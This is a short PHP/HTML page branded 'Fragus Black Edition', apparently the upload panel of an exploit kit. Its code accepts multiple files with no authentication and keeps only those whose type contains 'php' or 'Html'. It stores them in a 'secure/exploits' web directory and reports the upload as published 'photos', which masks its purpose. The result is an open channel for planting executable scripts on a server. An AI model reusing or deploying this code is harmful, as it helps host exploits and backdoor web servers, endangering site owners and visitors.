<html>
	
<head>
<title>Fragus</title>
<link href="up/style.css" rel="stylesheet" type="text/css">

</head>

<div class="background"><div class="transbox">


<div id="wb_Text1" style="margin:0;padding:0;position:absolute;left:710px;top:270px;width:397px;height:103px;text-align:left;z-index:1;">
<font style="font-size:30px" color="#ffffff" face="Impact">Fragus</font></div>
<div id="" style="margin:0;padding:0;position:absolute;left:730px;top:308px;width:397px;height:103px;text-align:left;z-index:1;">
<font style="font-size:11px" color="#ffffff" face="Arial">Black Edition</font></div>

<?php 

if(isset($_POST['enviar']) && $_POST['enviar'] == 'Enviar'){ 
	foreach ($_FILES["foto"]["error"] as $key => $error) { 
		$nombre_archivo = $_FILES["foto"]["name"][$key];   
		$tipo_archivo = $_FILES["foto"]["type"][$key];   
		$tamano_archivo = $_FILES["foto"]["size"][$key]; 
		$temp_archivo = $_FILES["foto"]["tmp_name"][$key]; 
 
		if (!((strpos($tipo_archivo, "php") || strpos($tipo_archivo, "Html")) && ($tamano_archivo < 10000000000)))  
		{   
    		echo ""; 
		} 
		else  
		{   
    		$nom_img = $nombre_archivo;      
    		$directorio = 'secure/exploits'; // Directorio
 
    		if (move_uploaded_file($temp_archivo,$directorio . "/" . $nom_img))  
    		{  
 			echo "Las fotos se publicaron correctamente"; 
			}  
		} 
	} // Fin Foreach 
} 
 
 
 
?>  
<form name="evento" action="" method="post" enctype="multipart/form-data"> 
<br /> 
<input type="file" name="foto[]" size="50" /><br>
<input type="file" name="foto[]" size="50" /><br> 
<input type="file" name="foto[]" size="50" /><br> 
<input type="file" name="foto[]" size="50" /><br>
<input type="file" name="foto[]" size="50" /><br><br>
<a href="Vercion"><input type="submit" name="enviar" value="Enviar"/></a>
</form>